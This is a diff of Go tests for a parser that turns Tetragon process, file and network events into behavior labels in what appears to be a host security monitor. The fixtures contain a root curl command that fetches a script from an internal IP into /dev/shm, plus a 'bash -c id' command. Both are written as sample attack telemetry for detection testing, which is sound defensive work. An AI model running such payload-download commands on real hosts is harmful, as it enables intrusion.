@@ -1,10 +1,6 @@
 package tetragon
 
-import (
-	"testing"
-
-	eventv1 "github.com/sysarmor/sysarmor-next-project/api/proto/event/v1"
-)
+import "testing"
 
 func TestParseProcessExecInfersCurlWrite(t *testing.T) {
 	raw := []byte(`{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`)
@@ -15,11 +11,11 @@ func TestParseProcessExecInfersCurlWrite(t *testing.T) {
 	if len(events) != 2 {
 		t.Fatalf("events = %d, want exec + inferred write", len(events))
 	}
-	if events[0].GetKind() != eventv1.EventKind_EVENT_KIND_EXEC {
-		t.Fatalf("first kind = %v, want EXEC", events[0].GetKind())
+	if events[0].GetBehavior() != "process.exec" {
+		t.Fatalf("first behavior = %v, want process.exec", events[0].GetBehavior())
 	}
-	if events[1].GetKind() != eventv1.EventKind_EVENT_KIND_WRITE || events[1].GetObject().GetPath() != "/dev/shm/x.sh" {
-		t.Fatalf("second event = %#v, want WRITE /dev/shm/x.sh", events[1])
+	if events[1].GetBehavior() != "file.write" || events[1].GetObject().GetPath() != "/dev/shm/x.sh" {
+		t.Fatalf("second event = %#v, want file.write /dev/shm/x.sh", events[1])
 	}
 }
 
@@ -32,19 +28,30 @@ func TestParseSocketConnect(t *testing.T) {
 	if len(events) != 1 {
 		t.Fatalf("events = %d, want 1", len(events))
 	}
-	if events[0].GetKind() != eventv1.EventKind_EVENT_KIND_CONNECT || events[0].GetObject().GetDst() != "10.66.0.99:443" {
-		t.Fatalf("event = %#v, want CONNECT 10.66.0.99:443", events[0])
+	if events[0].GetBehavior() != "network.connect" || events[0].GetObject().GetDst() != "10.66.0.99:443" {
+		t.Fatalf("event = %#v, want network.connect 10.66.0.99:443", events[0])
 	}
 }
 
-func TestParseProcessExitIsRecognizedAndSkipped(t *testing.T) {
+func TestParseProcessExitEmitsExit(t *testing.T) {
 	raw := []byte(`{"process_exit":{"process":{"pid":102,"uid":0,"binary":"/usr/bin/sleep","arguments":"1","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
 	events, ok := ParseLine(raw)
 	if !ok {
 		t.Fatal("process_exit should be recognized")
 	}
-	if len(events) != 0 {
-		t.Fatalf("events = %d, want skipped process_exit", len(events))
+	if len(events) != 1 || events[0].GetBehavior() != "process.exit" {
+		t.Fatalf("events = %+v, want one process.exit", events)
+	}
+}
+
+func TestParseProcessExecCloneEmitsFork(t *testing.T) {
+	raw := []byte(`{"process_exec":{"process":{"pid":103,"uid":0,"binary":"/bin/bash","arguments":"-c id","flags":"execve clone","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
+	events, ok := ParseLine(raw)
+	if !ok {
+		t.Fatal("process_exec should be recognized")
+	}
+	if len(events) != 2 || events[0].GetBehavior() != "process.exec" || events[1].GetBehavior() != "process.fork" {
+		t.Fatalf("events = %+v, want process.exec + process.fork", events)
 	}
 }
 
